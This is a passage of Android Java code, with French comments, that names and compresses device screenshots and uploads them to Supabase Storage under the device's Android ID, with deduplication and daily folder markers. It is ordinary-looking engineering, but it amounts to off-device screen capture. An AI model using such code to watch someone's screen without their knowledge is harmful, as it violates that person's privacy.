                // - "com.foo/com.foo.MainActivity"
                String pkg;
                String cls;
                if (c.contains("/")) {
                    String[] parts = c.split("/", 2);
                    pkg = parts[0];
                    cls = parts[1];
                    if (cls.startsWith(".")) cls = pkg + cls;
                } else {
                    return false;
                }
                intent = new Intent();
                intent.setClassName(pkg, cls);
            } else if (packageName != null && !packageName.trim().isEmpty()) {
                intent = getPackageManager().getLaunchIntentForPackage(packageName.trim());
            }
            if (intent == null) return false;
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private static Bitmap scaleDownIfNeeded(Bitmap src, int maxWidth) {
        if (src == null) return null;
        if (maxWidth <= 0) return src;
        int w = src.getWidth();
        int h = src.getHeight();
        if (w <= 0 || h <= 0) return src;
        if (w <= maxWidth) return src;

        float ratio = (float) maxWidth / (float) w;
        int newW = maxWidth;
        int newH = Math.max(1, Math.round(h * ratio));
        return Bitmap.createScaledBitmap(src, newW, newH, true);
    }

    private static byte[] compressToWebpLossy(Bitmap bmp, int quality) {
        if (bmp == null) return null;
        int q = Math.max(1, Math.min(quality, 100));
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try {
            // API 30+: WEBP_LOSSY (plus efficace que JPEG à qualité basse)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                bmp.compress(Bitmap.CompressFormat.WEBP_LOSSY, q, baos);
            } else {
                // Fallback (mais takeScreenshot nécessite déjà API 30+)
                bmp.compress(Bitmap.CompressFormat.JPEG, q, baos);
            }
            return baos.toByteArray();
        } catch (Exception e) {
            return null;
        } finally {
            try { baos.close(); } catch (Exception ignored) {}
        }
    }

    /**
     * Chemin Supabase Storage (format FR lisible) :
     * <android_id>/<dd-MM-yyyy>/<HH-mm-ss>.webp
     * (si collision: <HH-mm-ss>-1.webp, -2.webp, etc.)
     */
    private String buildScreenshotObjectPath() {
        ScreenshotPaths p = buildScreenshotPaths();
        return p == null ? null : p.objectPath;
    }

    private static final class ScreenshotPaths {
        final String deviceId;
        final String dayStr;
        final String objectPath;

        ScreenshotPaths(String deviceId, String dayStr, String objectPath) {
            this.deviceId = deviceId;
            this.dayStr = dayStr;
            this.objectPath = objectPath;
        }
    }

    private ScreenshotPaths buildScreenshotPaths() {
        String deviceId = SupabaseAndroidEventsClient.getAndroidIdOrNull(this);
        if (deviceId == null || deviceId.trim().isEmpty()) return null;

        Date now = new Date();
        SimpleDateFormat day = new SimpleDateFormat("dd-MM-yyyy", Locale.FRANCE);
        SimpleDateFormat time = new SimpleDateFormat("HH-mm-ss", Locale.FRANCE);
        String dayStr = day.format(now);
        String timeStr = time.format(now);
        String uniqueTime = ensureUniqueSecondFilename(timeStr);
        return new ScreenshotPaths(
                deviceId,
                dayStr,
                deviceId + "/" + dayStr + "/" + uniqueTime + ".webp"
        );
    }

    // Évite d'écraser un fichier si 2 captures tombent dans la même seconde.
    private final Object screenshotNameLock = new Object();
    private String lastScreenshotSecond = null;
    private int screenshotSecondSeq = 0;

    // Anti-doublon (heuristique): si la taille du fichier compressé est identique au dernier upload,
    // on évite de ré-uploader l'image (utile quand l'écran ne change pas).
    private final Object screenshotDedupLock = new Object();
    private int lastUploadedScreenshotSize = -1;
    private String lastUploadedScreenshotPath = null;

    private String ensureUniqueSecondFilename(String hhmmss) {
        synchronized (screenshotNameLock) {
            if (hhmmss == null) return "unknown";
            if (!hhmmss.equals(lastScreenshotSecond)) {
                lastScreenshotSecond = hhmmss;
                screenshotSecondSeq = 0;
                return hhmmss;
            }
            screenshotSecondSeq += 1;
            return hhmmss + "-" + screenshotSecondSeq;
        }
    }

    private boolean shouldSkipScreenshotUpload(int newSize, String newPath) {
        synchronized (screenshotDedupLock) {
            if (lastUploadedScreenshotSize <= 0 || lastUploadedScreenshotPath == null) return false;
            if (newPath != null && newPath.equals(lastUploadedScreenshotPath)) return false;
            return newSize == lastUploadedScreenshotSize;
        }
    }

    private void markScreenshotUploaded(int size, String path) {
        synchronized (screenshotDedupLock) {
            lastUploadedScreenshotSize = size;
            lastUploadedScreenshotPath = path;
        }
    }

    /**
     * Supabase Storage n'a pas de "répertoires" physiques, mais certains viewers/flows
     * s'attendent à ce que le préfixe existe. On crée donc un fichier marqueur
     * par jour (et on pré-crée aussi celui de demain) pour éviter tout "trou" à minuit.
     */
    private void ensureScreenshotFolders(String deviceId, String dayStr) {
        if (deviceId == null || deviceId.trim().isEmpty()) return;
        if (dayStr == null || dayStr.trim().isEmpty()) return;

        String prev = lastEnsuredScreenshotDay.get();
        if (dayStr.equals(prev)) return;
        if (!lastEnsuredScreenshotDay.compareAndSet(prev, dayStr)) return;

        // Crée un marqueur à la racine du device pour que le "dossier" apparaisse
        // directement à la racine du bucket (screenshots/<device_id>/...).
        byte[] markerDevice = ("device=" + deviceId).getBytes(java.nio.charset.StandardCharsets.UTF_8);
        String markerDevicePath = deviceId + "/_device.txt";
        SupabaseAndroidEventsClient.uploadScreenshot(this, markerDevice, markerDevicePath, "text/plain", true);

        byte[] markerToday = ("folder=" + dayStr).getBytes(java.nio.charset.StandardCharsets.UTF_8);
        String markerTodayPath = deviceId + "/" + dayStr + "/_folder.txt";
        SupabaseAndroidEventsClient.uploadScreenshot(this, markerToday, markerTodayPath, "text/plain", true);

        try {
            Date now = new Date();
            Date tomorrow = new Date(now.getTime() + 24L * 60L * 60L * 1000L);
            SimpleDateFormat dayFmt = new SimpleDateFormat("dd-MM-yyyy", Locale.FRANCE);
            String tomorrowStr = dayFmt.format(tomorrow);
            byte[] markerTomorrow = ("folder=" + tomorrowStr).getBytes(java.nio.charset.StandardCharsets.UTF_8);
            String markerTomorrowPath = deviceId + "/" + tomorrowStr + "/_folder.txt";
            SupabaseAndroidEventsClient.uploadScreenshot(this, markerTomorrow, markerTomorrowPath, "text/plain", true);
        } catch (Exception ignored) {}
    }
}
